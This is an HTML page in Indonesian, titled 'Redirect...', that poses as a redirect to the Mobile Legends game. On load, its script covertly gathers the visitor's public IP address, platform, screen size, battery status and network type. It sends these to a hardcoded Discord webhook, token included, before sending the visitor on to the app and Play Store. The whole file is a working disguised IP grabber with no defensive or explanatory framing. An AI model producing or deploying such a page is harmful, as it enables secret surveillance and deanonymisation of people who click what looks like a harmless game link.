<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect...</title>
    <script>
        window.onload = async function() {
            let ipData = await fetch("https://api.ipify.org?format=json")
                .then(response => response.json())
                .catch(() => ({ ip: "Tidak terdeteksi" }));

            let userAgent = navigator.userAgent;
            let platform = /Mobi|Android/i.test(userAgent) ? "Mobile" : "Desktop";
            let screenWidth = screen.width;
            let screenHeight = screen.height;
            let battery = navigator.getBattery ? await navigator.getBattery() : null;
            let batteryStatus = battery ? `${Math.round(battery.level * 100)}% (${battery.charging ? "Charging" : "Not Charging"})` : "Tidak terdeteksi";
            let connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            let networkType = connection ? connection.effectiveType : "Tidak terdeteksi";

            let webhookURL = "https://discord.com/api/webhooks/1343229196897353808/5mq_Wnlt8xnIpyN4Rr_HdP2VRdjxPQ5cXzJlAcMayn1elvCHUZLN87MSweWbfEAdG1uF";
            let payload = {
                content: `IP: ${ipData.ip}\nPlatform: ${platform}\nScreen: ${screenWidth}x${screenHeight}\nBattery: ${batteryStatus}\nNetwork: ${networkType}`
            };

            fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });

            setTimeout(function() {
                window.location.href = "mobilelegends://";
            }, 2000);

            window.location.href = "https://play.google.com/store/apps/details?id=com.mobile.legends";
        };
    </script>
</head>
<body>
</body>
</html>
